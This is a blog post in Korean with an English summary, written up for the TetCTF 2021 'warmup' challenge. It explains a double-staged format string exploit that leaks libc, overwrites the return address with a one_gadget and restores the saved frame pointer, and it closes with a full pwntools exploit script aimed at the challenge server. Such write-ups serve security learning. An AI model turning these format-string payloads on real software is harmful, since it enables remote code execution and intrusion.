---
layout: post
title: TetCTF 2021 warmup writeup
categories: ctf-write-up
tags: [ctf]
---


## warmup

현재 올라와있는 write-up과 주변 지인이 푼 방법을 들었을 때 아마 이 풀이는 `unintended solution` 일 것이다.

처음에 팀원이 이 문제를 보고 있다고해서 다른 문제를 보고있었는데 fsb가 발생하는 부분이 있다고 해서 그 부분만 이용해서 풀었다.



일단 더블스테이지를 이용하여 stack의 ret주소를 main함수로 변경하면서 libc_start_main_ret 주소를 leak한다.

이 과정에서 약간의 스택 주소에 대한 브포가 필요하다.



그 이후 스택을 가리키는 포인터 2개를 이용하여 ret 주소를 one_gadget 주소로 수정하면 된다.

이때 주의할 점은 스택을 가리키는 포인터를 이용할 경우 SFP가 변조되어 ret를 수정하더라도 다른 주소로 이동하게 된다.

따라서 SFP를 변조하여 ret를 수정한 이후에 다시 SFP를 원래 값으로 복원해주어야 하며 이 과정에서 약간의 브포가 필요하다.



대략 익스플로잇의 확률은 1/256 정도 되는거 같다. 문제를 50분정도 늦게 봐서 2분차이로 세컨드 솔브,,



요약 (Summary)

1. Using `double staged fsb`, change the return address of the stack to **main** and leak the **libc_start_main_ret** address.
   - a little brute forcing
2. Using `double staged fsb`, change the return address of the stack to **one_gadget**
3. Restore the `SFP`  
   - SFP should be changed when changing the return address of the stack.
   - When the SFP changes, it moves to a different address
   - a little brute forcing

```python
from pwn import * 

e = ELF('./warmup')
libc = e.libc

while True:
    #p = process('./warmup', env={'LD_PRELOAD':'./libc-2.23.so'})
    p = remote("192.46.228.70", 32337)

    # stage 1
    payload = ''
    payload += '%c' * 18
    payload += '%{}c'.format(0x88 - 18)
    payload += '%hhn'
    payload += '%{}c'.format(0xaa-0x88)
    payload += '%26$hhn'
    payload += '%29$p'

    p.sendlineafter('? ', '0')
    p.sendlineafter(': ', payload)

    p.recvuntil('0x')
    leak = int(p.recv(12), 16)
    libc_base = leak - libc.sym['__libc_start_main'] - 240

    print hex(libc_base)

    p.sendlineafter('Your bet (= 0 to exit): ','0')

    try:
        p.sendlineafter('Send to author your feeback: ', '0')
    except:
        p.close()
        continue

    one_gadget = libc_base + 0x45226

    try:
        p.sendlineafter('? ', '0')
    except:
        p.close()
        continue

    # stage 2
    payload = ''
    payload += '%c' * 8
    payload += '%{}c'.format(0x98 - 8)
    payload += '%hhn'
    payload += '%c' * 8
    payload += '%{}c'.format(0x199 - 0x98 - 8)
    payload += '%hhn'
    payload += '%{}c'.format(0x100 + (one_gadget & 0xff) - 0x99)
    payload += '%hhn'
    payload += '%{}c'.format(((one_gadget >> 8) & 0xffff) - (one_gadget & 0xff) - 0x200)
    payload += '%26$hn'

    # stage 3 (sfp restoration)
    payload += '%{}c'.format(0x178 - 0xd2)
    payload += '%10$hhn' # 78
    payload += '%{}c'.format(0x88 - 0x78)
    payload += '%20$hhn' # 88

    print hex(one_gadget)
    p.sendlineafter(': ', payload)

    p.sendlineafter('Your bet (= 0 to exit): ','0')
    p.sendlineafter('Send to author your feeback: ', '0')
    p.interactive()
```

